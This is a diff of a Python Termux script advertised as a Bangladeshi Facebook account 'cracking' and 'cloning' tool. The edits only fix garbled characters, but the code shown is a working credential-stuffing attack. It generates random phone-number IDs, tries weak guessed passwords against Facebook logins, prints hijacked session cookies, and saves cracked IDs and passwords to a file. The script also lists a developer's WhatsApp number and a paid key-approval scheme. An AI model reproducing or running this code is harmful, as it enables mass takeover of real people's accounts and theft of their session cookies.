@@ -16,18 +16,18 @@ import string
 try:
     import requests
 except ImportError:
-    print('\n [âœ“] installing requests !...\n')
+    print('\n [✓] installing requests !...\n')
     os.system('pip install requests')
 
 try:
     import concurrent.futures
 except ImportError:
-    print('\n [âœ“] installing futures !...\n')
+    print('\n [✓] installing futures !...\n')
     os.system('pip install futures')
 try:
     import bs4
 except ImportError:
-    print('\n [âœ“] installing bs4 !...\n')
+    print('\n [✓] installing bs4 !...\n')
     os.system('pip install bs4')
     os.system('git pull')
     os.system('pkg install curl')
@@ -137,21 +137,21 @@ def main_apv():
     except IOError:
         os.system("clear")
         print(logo)
-        print ("ï¿½ï¿½")
+        print ("��")
         print ("YOUR TOKEN IS NOT APROVAL")     
         print ("         THIS IS YOUR TOKEN")
-        print ("ï¿½ï¿½")
+        print ("��")
         print ("")
         myid=uuid.uuid4().hex[:10].upper()
         print ("          YOUR KEY : "+ak+myid+imt)
-        print ("ï¿½ï¿½")
+        print ("��")
         kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
         kok.write(myid+imt)
         kok.close()
         print ("")
         print ("")
         print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
-        print ("ï¿½ï¿½")
+        print ("��")
         time.sleep(3.5)
         tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
 
@@ -178,19 +178,19 @@ logo=("""
  |_| \_|_____|_|  \_\\____/|____/    
                               ______ 
                              |______|                                                                                                                             
-\33[1;92mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—               
-â•‘  \x1b[97m\033[37;41m Welcome to CYBER Tools                          \033[0;m  â•‘
-\33[1;92mâ•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•                      
-\33[1;92mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—               
-â•‘  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1 \033[0;m    â•‘
-\33[1;92mâ•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•            
-\33[1;92mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—
-\33[1;92mâ•‘âž£\033[1;91m DEVOLPER   :          NIROB  \33[1;92mâ•‘               
-\33[1;92mâ•‘âž£ FACEBOOK   :          Hello Hacker,s 0.2 \33[1;92mâ•‘                 
-\33[1;92mâ•‘âž£\033[1;93m WHATSAPP   :          01758481525        \33[1;92m â•‘
-\33[1;92mâ•‘âž£\033[1;34m GITHUB     :          Nirob-vai         \33[1;92m â•‘          
-\33[1;92mâ•‘âž£\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m â•‘                 
-\33[1;92mâ•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•
+\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
+║  \x1b[97m\033[37;41m Welcome to CYBER Tools                          \033[0;m  ║
+\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
+\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
+║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1 \033[0;m    ║
+\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
+\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+\33[1;92m║➣\033[1;91m DEVOLPER   :          NIROB  \33[1;92m║               
+\33[1;92m║➣ FACEBOOK   :          Hello Hacker,s 0.2 \33[1;92m║                 
+\33[1;92m║➣\033[1;93m WHATSAPP   :          01758481525        \33[1;92m ║
+\33[1;92m║➣\033[1;34m GITHUB     :          Nirob-vai         \33[1;92m ║          
+\33[1;92m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m ║                 
+\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 """)
 def cek_apk(session,coki):
 	w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -201,7 +201,7 @@ def cek_apk(session,coki):
 		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
 	else:
 		print("")
-		print(f'\rðŸŽ® %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
+		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
 		for i in range(len(game)):
 			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
 	w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
@@ -211,7 +211,7 @@ def cek_apk(session,coki):
 	if len(game)==0:
 		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
 	else:
-		print(f'\r ðŸŽ® %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
+		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
 		for i in range(len(game)):
 			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
 def Main():
@@ -222,7 +222,7 @@ def Main():
 	print("[\033[1;37m03\33[1;92m][\033[1;93mC\33[1;92m] CONTACT ME ON FB")
 	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] MY WHATSAPP")
 	print('[\033[1;37m00\33[1;92m][\033[1;93mE\33[1;92m] EXIT PROGRAMMING')
-	print(54*'â”')
+	print(54*'━')
 	opt = input('Choose option >>> ')
 	if opt in ["A","1"]:
 		ASRAF()
@@ -261,11 +261,11 @@ def ASRAF():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print(" â”â”[â€¢] BD SIM CODE 017 015 018 019 013 015 016]")
-	kode = input(' â”—â”[+] SELECT : ')
+	print(" ┏━[•] BD SIM CODE 017 015 018 019 013 015 016]")
+	kode = input(' ┗━[+] SELECT : ')
 	doamin = ' BD Number id cloner [ONLY-OK] '
-	print(' â”â”[â€¢] EXAMPLE : 1000,5000,10000,15000,20000] ')
-	limit = int(input(' â”—â”[+] LIMIT : '))
+	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
+	limit = int(input(' ┗━[+] LIMIT : '))
 	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
@@ -275,18 +275,18 @@ def ASRAF():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('â”â”[â€¢] COUNTRY    : Bangladesh')
-		print('â”£â”[â€¢] TOTAL ID   :  '+tl)
-		print(f'â”£â”[â€¢] SIM CODE   : \033[1;92m {kode} ')
-		print('â”—â”[â€¢] START BD UID MIXT CRACKING... ')
-		print(50*'â”')
+		print('┏━[•] COUNTRY    : Bangladesh')
+		print('┣━[•] TOTAL ID   :  '+tl)
+		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
+		print('┗━[•] START BD UID MIXT CRACKING... ')
+		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
-	print(' [ðŸ’‰] Crack process has been completed')
-	print(' [ðŸ’‰] Ids saved in ok.txt,cp.txt')
+	print(' [💉] Crack process has been completed')
+	print(' [💉] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 
@@ -333,10 +333,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [ASRAF-ðŸ’š] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\033[1;92m=[ðŸ’™]=COOKIE : '+coki)
+                print(f'\r\33[1;92m [ASRAF-💚] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/ASRAF-OKðŸ’¥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/ASRAF-OK💥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
